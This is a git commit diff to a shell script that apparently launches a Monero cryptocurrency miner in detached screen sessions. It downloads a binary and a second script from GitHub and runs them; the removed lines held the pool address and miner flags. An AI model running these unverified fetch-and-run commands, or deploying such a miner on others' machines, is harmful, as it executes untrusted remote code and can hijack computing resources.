e6afcd0ffec509515bd5a82a73e00366148d652a
renilo <88342640+renilo@users.noreply.github.com>
2021-08-28 19:05:52 +0700

    Update xautokontol.sh

--- xautokontol.sh
+++ xautokontol.sh
@@ -8,12 +8,8 @@ screen -dmS xhajar.sh ./xhajar.sh 65 75
 
 wget https://github.com/renilo/xmr/raw/main/hajar
 
-POOL=208.113.200.73:443
+wget https://raw.githubusercontent.com/renilo/xmr/main/xhajar.sh
 
-WALLET=THISPC
+chmod +x xhajar.sh
 
-WORKER=$(echo $(shuf -i 1-10000 -n 1)-GPU)
-
-chmod +x hajar
-
-screen -dmS run ./hajar --donate-level 1 -o $POOL -u $WALLET.$WORKER -p x -k -a rx/0 -t 4
+./xhajar.sh
